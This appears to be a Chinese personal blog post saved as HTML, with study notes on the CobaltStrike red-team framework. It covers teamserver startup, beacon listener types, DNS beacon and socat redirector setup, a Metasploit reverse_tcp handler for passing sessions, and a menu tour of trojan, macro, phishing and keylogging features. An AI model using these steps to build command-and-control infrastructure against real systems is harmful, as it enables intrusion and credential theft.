@@ -1,0 +1,772 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+  
+<head>
+  <meta charset="utf-8">
+  <meta name="author" content="johnscott" />
+  
+  
+  
+  <title>CobaltStrike | JohnScott1989的博客</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="网络安全,网络安全," />
+  
+
+  <script>
+    console.log('\n%c Hexo-theme-bmw v4.0 ' + '%c 🎉 https://github.com/dongyuanxin/theme-bmw 🎉\n' + '\n%c View demo online ' + '%c 🔍 https://godbmw.com/ 🔍  \n' , 'color: #fadfa3; background: #030307; padding:3px 0;', '', 'color: #fadfa3; background: #030307; padding:3px 0;', '');
+  </script>
+
+  
+    <meta name="description" content="超级帽子戏法的个人博客,主要记录复制粘贴过来的笔记,还有自己的一些心得体会">
+  
+
+  
+
+  
+    <link rel="icon" href="/images/favicon.ico">
+    <link rel="apple-touch-icon" href="/images/touch-icon.png">
+  
+
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/icon/iconfont.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+
+
+  
+<script src="/js/util.js"></script>
+<script src="/js/valine.min.js"></script>
+
+
+  
+
+  
+    <link href="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.css" rel="stylesheet">
+    <script src="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.js" async></script>
+  
+
+  
+    <link href="https://cdn.bootcss.com/social-share.js/1.0.16/css/share.min.css" rel="stylesheet">
+  
+  
+  <script src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js" async></script>
+  
+  
+    <script src="//cdn.jsdelivr.net/npm/leancloud-storage@3.11.0/dist/av-min.js"></script>
+  
+
+<meta name="generator" content="Hexo 5.1.1"></head>
+
+  <body>
+
+    
+
+    <div id="app">
+
+      <div class="header-wrap">
+  <header>
+    <div class="site-brand">
+      <div class="site-title">
+        <a href="/">JohnScott1989</a>
+      </div>
+    </div>
+    <nav class="site-navigation">
+      <ul class="nav-menu">
+      
+        <li class="nav-item" data-path="/">
+          
+            <a 
+              href="/"
+              target="_self"
+            >
+              主页
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          
+            <a 
+              href="/archives/"
+              target="_self"
+            >
+              归档
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          
+            <a 
+              href="/categories/"
+              target="_self"
+            >
+              分类
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          
+            <a 
+              href="/tags/"
+              target="_self"
+            >
+              标签
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          
+            <a 
+              href="/friends/"
+              target="_self"
+            >
+              友链
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          
+            <a 
+              href="/about/"
+              target="_self"
+            >
+              关于
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="">
+          
+            <a href="javascript:void(0);" v-else>联系我</a>
+            <ul class="nav-menu--dropdown">
+              
+                <li>
+                  <a 
+                    href="https://github.com/liuxue5213" 
+                    target="_blank"
+                  >
+                    Github
+                  </a>
+                </li>
+              
+                <li>
+                  <a 
+                    href="https://www.zhihu.com/people/liuxue5213" 
+                    target="_blank"
+                  >
+                    知乎
+                  </a>
+                </li>
+              
+                <li>
+                  <a 
+                    href="http://weibo.com/liuxue5213" 
+                    target="_blank"
+                  >
+                    微博
+                  </a>
+                </li>
+              
+                <li>
+                  <a 
+                    href="https://www.douban.com/people/liuxue5213" 
+                    target="_blank"
+                  >
+                    豆瓣
+                  </a>
+                </li>
+              
+                <li>
+                  <a 
+                    href="/linkedin.com/in/liuxue5213" 
+                    target="_blank"
+                  >
+                    linkedin
+                  </a>
+                </li>
+              
+            </ul>
+          
+        </li>
+      
+      </ul>
+    </nav>
+    <i class="iconfont icon-menu"></i>
+  </header>
+</div>
+
+<script>
+  let links = document.querySelectorAll('.nav-item');
+  for(let link of links){
+    let childrenLink = link.querySelector('ul');
+    link.addEventListener('mouseenter', () => {
+      if(childrenLink) {
+        childrenLink.className = "nav-menu--dropdown active";
+      }
+    })
+    link.addEventListener('mouseleave', () => {
+      if(childrenLink) {
+        childrenLink.className = "nav-menu--dropdown";
+      }
+    })
+  }
+  let rootRealPath = getRealPath(window.location.pathname, true);
+  for(let link of links) {
+    let linkPath = link.getAttribute("data-path");
+    if(linkPath && getRealPath(linkPath, true) === rootRealPath) {
+      link.className = "nav-item hover";
+    }
+  }
+
+  let iconMenu = document.querySelector("i.iconfont.icon-menu"),
+    iconMenuClicked = false;
+  let navDOM = document.querySelector("nav.site-navigation");
+  iconMenu.addEventListener("click", () => {
+    iconMenuClicked 
+      ? navDOM.className = "site-navigation active"
+      : navDOM.className = "site-navigation";
+    iconMenuClicked = !iconMenuClicked;
+  })
+</script>
+
+      
+
+
+
+
+
+
+
+
+<div class="container post-index">
+
+  
+
+<div class="post">
+  <h1 class="article-title">
+    <span>CobaltStrike</span>
+  </h1>
+  <div class="article-top-meta">
+    <span>
+      发布 : 
+      2021-12-01
+    </span>
+    
+      <span>
+        分类 : 
+          <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
+            网络安全
+          </a>
+      </span>
+    
+    
+      <span>
+        浏览 : <span class="article-timer" data-identity="49CobaltStrike"></span>
+      </span>
+    
+  </div>
+
+  
+
+  <div class="article-content">
+    <div class="markdown-body">
+      <p>网络安全(一)CobaltStrike</p>
+<h2 id="CobaltStrike"><a href="#CobaltStrike" class="headerlink" title="CobaltStrike"></a>CobaltStrike</h2><h3 id="CobaltStrike-1"><a href="#CobaltStrike-1" class="headerlink" title="CobaltStrike"></a>CobaltStrike</h3><p>CobaltStrike是一款渗透测试神器，被业界人称为CS神器。</p>
+<p>CobaltStrike分为客户端与服务端，服务端是一个，客户端可以有多个，可被团队进行分布式协团操作。 </p>
+<p>CobaltStrike 集成了端口转发、服务扫描，自动化溢出，多模式端口监听，windows exe木马生成，windows dll木马生成，java木马生成，office宏病毒生成，木马捆绑。</p>
+<p>钓鱼攻击包括：站点克隆，目标信息获取，java执行，浏览器自动攻击等等强大的功能</p>
+<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>需要java环境，解压后直接运行加本机ip和客户端连接密码</p>
+<p>apt install default-jre</p>
+<p>sudo update-alternatives –config java<br>显示Java的每个安装及其安装路径<br>vim /etc/environment<br>末尾追加 JAVA_HOME=”/usr/lib/jvm/java-11-openjdk-amd64/bin/java”<br>source /etc/environment<br>echo $JAVA_HOME</p>
+<h3 id="开启团队服务"><a href="#开启团队服务" class="headerlink" title="开启团队服务"></a>开启团队服务</h3><p>团队服务只可以运行在linux环境下</p>
+<p>./teamserver {ip} {password}</p>
+<h3 id="scaling-red-operations"><a href="#scaling-red-operations" class="headerlink" title="scaling red operations"></a>scaling red operations</h3><p>跨越长期时间内的多个目标网络/跨越长期时间内的一个目标网络下的多个行动</p>
+<p>目标单元<br>    负责具体目标或具体行动的对象<br>    工作是获得通道、后渗透、内网横向延展<br>全通道管理单元<br>    给所有网络提供技术通道</p>
+<p>最好的通道是没有参与过行动的</p>
+<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>Operating System操作系统/Payload/Stager传输器</p>
+<p>传输器 stager，一段很小的代码，连接并下载真正的payload到机器，并且加入到内存中</p>
+<h3 id="Create-a-listener"><a href="#Create-a-listener" class="headerlink" title="Create a listener"></a>Create a listener</h3><p>监听类型</p>
+<ol>
+<li><p>beacon<br>低且慢、隐蔽的后攻击渗透代理。有两种通信模式，一种是异步通信模式，这种模式通信效率缓慢，Beacon回连团队服务器、下载任务、然后休眠；另一种是交互式通信模式，这种模式的通信是实时发生的。</p>
+<p> http/https 默认设置情况下，HTTP和HTTPS Beacon通过GET请求来下载任务。通过POST请求传回数据<br> dns 使用DNS请求将Beacon返回，隐蔽性好，不开放任何端口，规避防火墙，用53端口响应，缺点速度慢</p>
+<pre><code> 浏览器的dns缓存-&gt;本地host文件-&gt;DNS服务器-&gt;根DNS服务器</code></pre>
+<p> smb协议是点对点通信 </p>
+</li>
+<li><p>foreign 外部监听器，目的是给其他的payload提供监听，比如msf</p>
+</li>
+</ol>
+<p>监听器管理功能支持重定向。当设置HTTP/HTTPS Beacon监听器时，重定向跳板机IP。<br>如果提供的Host不属于当前主机（不是团队服务器的IP），CS就假设它是重定向器。 </p>
+<p>可以使用socat工具将服务器转变为重定向器，将跳板机80端口上的所有连接转发到的团队服务器IP的80端口<br>跳板机 socat TCP4-LISTEN:80,fork TCP4:[团队服务器]:80</p>
+<h4 id="dns-beacon"><a href="#dns-beacon" class="headerlink" title="dns beacon"></a>dns beacon</h4><ol>
+<li>团队服务端，配置域名，开放50050端口和53端口</li>
+<li>在域名解析，添加NS记录，主机记录例如dns、dns1、dns2，记录值是当前域名，NS记录就是将解析任务交由一个指定的权威dns服务器(在这里teamserver就是我们的权威dns)</li>
+<li>add listener<br>=&gt; name<br>=&gt; payload: beacon dns<br>=&gt; dns hosts: dns.域名、dns1.域名、dns2.域名<br>=&gt; dns hosts(stager): dns.域名</li>
+</ol>
+<h4 id="重定器"><a href="#重定器" class="headerlink" title="重定器"></a>重定器</h4><p>add listener<br>payload: beacon http<br>http hosts: 跳板机1,跳板机2,跳板机3<br>host rotation strategy: round-robin<br>http host(strategy): 团队服务器<br>profile: default<br>http port(c2): 80</p>
+<p>然后生成一个shell到目标机器执行，可以看到目标机器连接的是跳板机的ip<br>netstat -ano</p>
+<h3 id="获取到会话后反弹给msf"><a href="#获取到会话后反弹给msf" class="headerlink" title="获取到会话后反弹给msf"></a>获取到会话后反弹给msf</h3><p>use exploit/multi/handler<br>set payload windows/meterpreter/reverse_tcp<br>set lhost 192.168.1.230<br>set lport 5555<br>exploit -j  -j后台监听或者run</p>
+<p>Linux上线教程如下 <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/t9a4g7j4EJ4q-nnNRc-WZQ">https://mp.weixin.qq.com/s/t9a4g7j4EJ4q-nnNRc-WZQ</a><br>Linux 记得使用 shell + 命令</p>
+<h3 id="参数详情"><a href="#参数详情" class="headerlink" title="参数详情"></a>参数详情</h3><p>New Connection  新建连接，支持连接多个服务器端<br>Preferences  设置 Cobal Strike 界面、控制台、以及输出报告样式、TeamServer 连接记 录</p>
+<p>Visualization  主要展示输出结果的视图<br>VPN Interfaces  设置 VPN 接口<br>Listenrs  创建监听器<br>Script Manager  脚本管理，可以通过 AggressorScripts 脚本来加强自身，能够扩展菜单栏，Beacon 命令行，提权脚本等<br>Close  退出连接 </p>
+<p>View Applications  显示受害主机的应用信息<br>Credentials  显示所有以获取的受害主机的凭证，如 hashdump、Mimikatz<br>Downloads  查看已下载文件<br>Event Log  主机上线记录以及团队协作聊天记录<br>Keystrokes  查看键盘记录结果 </p>
+<p>Proxy Pivots  查看代理模块<br>Screenshots  查看所有屏幕截图<br>Script Console  加载第三方脚本以增强功能<br>Targets  显示所有受害主机<br>Web Log  所有Web服务的日志</p>
+<p>Attacks<br>Packages<br>HTML Application  生成(executable/VBA/powershell)这三种原理实现的恶意 HTA 木马 文件MS<br>Office Macro  生成office宏病毒文件<br>Payload Generator  生成各种语言版本的 payload<br>USB/CD AutoPlay  生成利用自动播放运行的木马文件<br>Windows Dropper  捆绑器能够对任意的正常文件进行捆绑(免杀效果差)<br>Windows Executable  生成可执行 exe 木马<br>Windows Executable(Stageless)  生成无状态的可执行 exe 木马</p>
+<p>Web Drive-by<br>Manage  对开启的web服务进行管理<br>Clone Site  克隆网站，可以记录受害者提交的数据<br>Host File  提供文件下载，可以选择Mime类型<br>Scripted Web Delivery  为payload提供 web 服务以便下载和执行，类似于 Metasploit 的 web_delivery<br>Signed Applet Attack  使用java自签名的程序进行钓鱼攻击(该方法已过时)<br>Smart Applet Attack  自动检测java版本并进行攻击，针对 Java 1.6.0_45 以下以及 Java 1.7.0_21 以下版本(该方法已过时) System Profiler用来获取系统信息，如系统版本，Flash 版本，浏览器版本等<br>Spear Phish  鱼叉钓鱼邮件</p>
+<p>Reporting<br>Activity Report  活动报告<br>Hosts Report  主机报告<br>Indicators of Compromise  IOC报告：包括 C2 配置文件的流量分析、域名、IP 和上传文 件的 MD5 hashes<br>Sessions Report  会话报告<br>Social Engineering Report  社会工程报告：包括鱼叉钓鱼邮件及点击记录<br>Tactics, Techniques, and Procedures  战术技术及相关程序报告：包括行动对应的每种战 术的检测策略和缓解策略<br>Reset Data  重置数据<br>Export Data  导出数据，导出.tsv 文件格式</p>
+<p>Help<br>Homepage  官方主页<br>Support  技术支持<br>Arsenal  开发者<br>System information  版本信息<br>About  关于</p>
+<p>创建监听器<br>CobaltStrike 的内置监听器为Beacon，外置监听器为Foreign<br>CobaltStrike 的Beacon支持异步通信 和 交互式通信</p>
+<p>点击左上方 CobaltStrike 选项——&gt;在下拉框中选择 Listeners ——&gt;在下方弹出区域中单机 add CobaltStrike4.0 </p>
+<p>目前有以下8种Payload选项：<br>name：为监听器名字，可任意<br>payload：payload 类型<br>HTTP Hosts: shell 反弹的主机，也就是我们 kali 的 ip<br>HTTP Hosts(Stager): Stager 的马请求下载 payload 的地址<br>HTTP Port(C2): C2 监听的端口</p>
+
+    </div>
+  </div>
+  
+    <div class="copy-right">
+      <div class="markdown-body">
+        <blockquote>
+        
+        
+          本文作者 : JohnScott <br/>
+        
+        原文链接 : <a href="">https://github.com/liuxue5213/liuxue5213.github.io/2021/49CobaltStrike/</a><br>
+        版权声明 : 本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！
+        </blockquote>
+      </div>
+    </div>
+  
+  
+  
+    <div class="social-share"
+  style="margin-top: -2rem"
+  data-wechat-qrcode-title="<p>微信扫一扫</p>"
+  data-wechat-qrcode-helper="<p>微信右上角, 扫一扫分享</p>"
+   data-sites="qzone, qq, weibo, wechat, douban, google, facebook, twitter" 
+  
+>
+  <span style="color: #6b7487; font-size: 1.4rem;">分享到: </span>
+</div>
+<script src="https://cdn.bootcss.com/social-share.js/1.0.16/js/social-share.min.js" async>
+  
+
+  
+    <div id="reward">
+  
+    <p id="reward-meta">知识 & 情怀 | 二者兼得</p>
+  
+  <button id="reward-btn">
+    
+    <span>感谢您的关心</span>
+  </button>
+  <div id="reward-qrcode">
+    
+      <div class="reward-qrcode--container">
+        <img class="qrcode-img" src="/images/wechat.png" alt="微信扫一扫">
+        <p class="qrcode-meta">微信扫一扫</p>
+      </div>
+    
+      <div class="reward-qrcode--container">
+        <img class="qrcode-img" src="/images/alipay.png" alt="支付宝扫一扫">
+        <p class="qrcode-meta">支付宝扫一扫</p>
+      </div>
+    
+  </div>
+
+</div>
+
+<script>
+  (() => {
+    let button = document.querySelector('#reward-btn'),
+      qrcode = document.querySelector('#reward-qrcode'),
+      display = false;
+    
+    button.addEventListener('click', () => {
+      qrcode.style.display = display ? 'none' : 'block'
+      display = !display
+    }, false)
+  })()
+</script>
+  
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+      <span>
+        
+          <i class="iconfont icon-06tags"></i>标签: 
+          
+          <span class="span--tag">
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
+              #网络安全
+            </a>
+          </span>
+          
+        
+      </span>
+    </div>
+    <div class="article-meta pull-right">
+    </div>
+  </div>
+</div>
+
+
+  <aside id="sidebar">
+    <p id="sidebar-header"></p>
+    <ol id="sidebar-toc"></ol>
+  </aside>
+  <script async>setTimeout(generateToc, 10);</script>
+
+
+  <nav class="post-navigation">
+    
+      <div class="nav-pre">
+        <i class="iconfont icon-prev"></i>
+        上一篇:
+        <a href="/2021/shell/" target="_self">shell</a>
+      </div>
+    
+    
+      <div class="nav-next">
+        下一篇:
+        <a href="/2021/nc/" target="_self">NC反弹shell</a>
+        <i class="iconfont icon-next"></i>
+      </div>
+    
+  </nav>
+
+  
+    <a href="#comment" class="comment-anchor"></a>
+<div class="comment-title"><i class="iconfont icon-footprint"></i> 留下足迹 <i class="iconfont icon-footprint"></i></div>
+<div id="vcomments"></div>
+
+<script defer>
+  if( true ) {
+    let path = getRealPath()
+    new Valine({
+      el: "#vcomments",
+      appId: "E4f1KI8G9DKenPGcXCkfpCMV-gzGzoHsz",
+      appKey: "6VNHrdDAu0JKJXxyMajHk6qD",
+      notify: false,
+      verify: false,
+      avatar: "robohash",
+      placeholder: "正确填写邮箱, 才能及时收到回复哦♪(^∇^*)",
+      path
+    });
+  }
+</script>
+   
+
+  
+    <script defer>
+const valineAPI = (() => {
+  try {
+    AV.init("E4f1KI8G9DKenPGcXCkfpCMV-gzGzoHsz", "6VNHrdDAu0JKJXxyMajHk6qD");
+  } catch(error) {}
+  const isExist = (identity) => {
+    identity = identity || getRealPath();
+    let query = new AV.Query('Timer');
+    return new Promise((resolve, reject) => {
+      query.equalTo("identity", identity);
+      query.find().then(results => {
+        resolve(results.length > 0);
+      }, error => reject(error));
+    })
+  }
+
+  const _get = (identity) => {
+    let query = null;
+    if(identity && identity instanceof Array){
+      let querys = [];
+      for(let i = 0; i < identity.length; ++i) {
+        querys[i] = new AV.Query('Timer');
+        querys[i].equalTo('identity', identity[i]);
+      }
+      query = AV.Query.or.apply(null ,querys);
+    } else {
+      identity = identity || getRealPath();
+      query = new AV.Query("Timer");
+      query.equalTo("identity", identity);
+    }
+
+    return new Promise((resolve, reject) => {
+      query.find()
+      .then(results => resolve(results))
+      .catch(error => reject(error))
+    })
+  }
+
+  const create = (identity) => {
+    identity = identity || getRealPath();
+    return new Promise((resolve, reject) => {
+      let Todo = AV.Object.extend('Timer');
+      let todo = new Todo();
+      todo.set("times", 1);
+      todo.set("identity", identity);
+      todo.save().then(res => resolve(true), error => reject(error));
+    })
+  }
+
+  const update = (identity) => {
+    identity = identity || getRealPath();
+    return new Promise((resolve, reject) => {
+      let query = new AV.Query('Timer');
+      query.equalTo("identity", identity);
+      query.find().then(todos => {
+        todos.forEach(todo => {
+          todo.set("times", todo.attributes.times + 1);
+        });
+        return AV.Object.saveAll(todos);
+      }).then(todos => resolve(true), error => reject(error));
+    })
+  }
+
+  return {
+    isExist,
+    _get,
+    update,
+    create
+  }
+})()
+
+const calcAndWriteTimes = () => {
+  let isPost = true;
+
+  let timerAllDOM = document.querySelectorAll(".article-timer");
+
+  if(isPost) {
+    let identity = timerAllDOM[0].getAttribute("data-identity");
+    valineAPI.isExist(identity)
+    .then(exist => {
+      if(exist) {
+        return valineAPI.update(identity);
+      }
+      return new Promise(resolve => resolve(true));
+    })
+    .then( succuess => valineAPI._get(identity))
+    .then( result => timerAllDOM[0].innerText = result[0].attributes.times)
+    .catch(error => console.log(error.message))
+    return ;
+  }
+
+  let timerDOMCache = {};
+
+  for(let timerDOM of timerAllDOM) {
+    let identity = timerDOM.getAttribute("data-identity");
+    if(timerDOMCache.hasOwnProperty(identity)){
+      timerDOMCache[identity].dom.push(timerDOM);
+    }else{
+      timerDOMCache[identity] = {
+        dom: [timerDOM],
+        times: undefined
+      };
+    }
+  }
+
+  let identities = Object.keys(timerDOMCache);
+  valineAPI._get(identities).then(results => {
+    for(let result of results) {
+      let {identity, times} = result.attributes;
+      timerDOMCache[identity].times = times;
+      timerDOMCache[identity].dom.map(item => item.innerText = times);
+    }
+    for(let identity of identities) {
+      if(timerDOMCache[identity].times){
+        continue;
+      }
+      timerDOMCache[identity].dom.map(item => item.innerText = 1);
+      valineAPI.create(identity);
+    }
+  }).catch(error => console.log(error.message))
+}
+
+if(true){
+  calcAndWriteTimes();
+}
+</script>
+   
+
+</div>
+
+
+      <footer>
+  <p class="site-info">
+    博客已萌萌哒运行<span id="time-to-now"></span><span class="my-face">(●'◡'●)ﾉ♥</span>
+    <br>
+    Theme - <a href="https://github.com/dongyuanxin/theme-bmw">BMW</a> | Made With 💗 | Powered by <a target="_blank" rel="noopener" href="https://godbmw.com/">GodBMW</a>
+    <br>
+    
+  </p>
+</footer>
+
+
+
+<script>
+const timeToNowDOM = document.querySelector("#time-to-now");
+const startTimestamp = new Date(2015, 0, 1).getTime();
+
+const updateTimeStr = () => {
+  let offset = parseInt(
+      (new Date().getTime() - startTimestamp) / 1000,
+      10
+    ),
+    day = Math.floor(offset / 86400),
+    hour = Math.floor((offset % 86400) / 3600),
+    minute = Math.floor(((offset % 86400) % 3600) / 60),
+    second = Math.floor(((offset % 86400) % 3600) % 60);
+  timeToNowDOM.innerHTML =
+    day + "天" + hour + "小时" + minute + "分钟" + second + "秒";
+  setTimeout(updateTimeStr, 500);
+}
+
+setTimeout(updateTimeStr, 500);
+</script>
+
+
+      <div class="back-to-top hidden">
+  <span>
+    <i class="iconfont icon-60"></i><span></span>%
+  </span>
+</div>
+
+<script>
+const updateIconToTop = percent => {
+  let dom = document.querySelector(".back-to-top span span");
+  dom.innerText = percent;
+  if(percent < 1) {
+    document.querySelector(".back-to-top").className = "back-to-top hidden";
+  } else {
+    document.querySelector(".back-to-top").className = "back-to-top";
+  }
+}
+
+const handleScoll = () => {
+  let isRunning = false;
+  return () => {
+    if (isRunning) return;
+    isRunning = true;
+    window.requestAnimationFrame(timestamp => {
+      let scrollTop =
+          document.documentElement.scrollTop || document.body.scrollTop,
+        scrollHeight =
+          document.documentElement.scrollHeight ||
+          document.body.scrollHeight,
+        clientHeight =
+          document.documentElement.clientHeight ||
+          document.body.clientHeight;
+      isRunning = false;
+      if (scrollTop <= 1) {
+        updateIconToTop(0);
+        return;
+      }
+      if (scrollTop + clientHeight >= scrollHeight) {
+        updateIconToTop(100);
+      } else {
+        updateIconToTop(parseInt(
+          100 * scrollTop / (scrollHeight - clientHeight),
+          10
+        ));
+      }
+    });
+  };
+}
+
+const backToTop = () => {
+  let scrollTop =
+      document.documentElement.scrollTop || document.body.scrollTop,
+    delay = 10,
+    time = 200;
+  if (scrollTop <= 20) {
+    document.documentElement.scrollTop = 0;
+    document.body.scrollTop = 0;
+    return;
+  }
+  let step = Math.ceil(scrollTop * delay / time);
+  let timer = setInterval(() => {
+    scrollTop =
+      document.documentElement.scrollTop || document.body.scrollTop;
+    if (scrollTop - step <= 0) {
+      document.documentElement.scrollTop = 0;
+      document.body.scrollTop = 0;
+      clearInterval(timer);
+    } else {
+      document.documentElement.scrollTop = scrollTop - step;
+      document.body.scrollTop = scrollTop - step;
+    }
+  }, delay);
+}
+
+document.addEventListener("scroll", handleScoll(), false);
+
+document.querySelector(".back-to-top").addEventListener("click", backToTop, false);
+
+</script>
+
+    </div>
+
+    
+      <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
+<script>
+  (() => {
+    const mathjaxConfig = {
+      showProcessingMessages: false, //关闭js加载过程信息
+      messageStyle: "none", //不显示信息
+      jax: ["input/TeX", "output/HTML-CSS"],
+      tex2jax: {
+        inlineMath: [["$", "$"], ["\\(", "\\)"]], //行内公式选择符
+        displayMath: [["$$", "$$"], ["\\[", "\\]"]], //段内公式选择符
+        skipTags: ["script", "noscript", "style", "textarea", "pre", "code", "a"] //避开某些标签
+      },
+      "HTML-CSS": {
+        availableFonts: ["STIX", "TeX"], //可选字体
+        showMathMenu: false //关闭右击菜单显示
+      }
+    }
+
+    let mathjaxInterval = setInterval(() => {
+      if(!window.MathJax){
+        return;
+      }
+      window.MathJax.Hub.Config(mathjaxConfig)
+      window.MathJax.Hub.Queue(["Typeset", MathJax.Hub, document.getElementById('app')])
+
+      clearInterval(mathjaxInterval)
+    }, 10)    
+  })()
+</script>
+    
+
+    <script src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js" async></script>
+<script async>
+  let fancyTimer = setInterval(function(){
+    if(!window.$){
+      return;
+    }
+    $(document).ready(function() {
+      $(".post img").each(function () {
+        if($(this).parent().get(0).tagName.toLowerCase() === "a") {
+          return;
+        }
+        // $(this).attr("data-fancybox", "gallery"); // if you add 'data-fancybox', img will display after showed
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "gallery");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      });
+      
+      clearInterval(fancyTimer);
+    });
+  }, 10);
+</script>
+
+    
+  </body>
+
+</html>
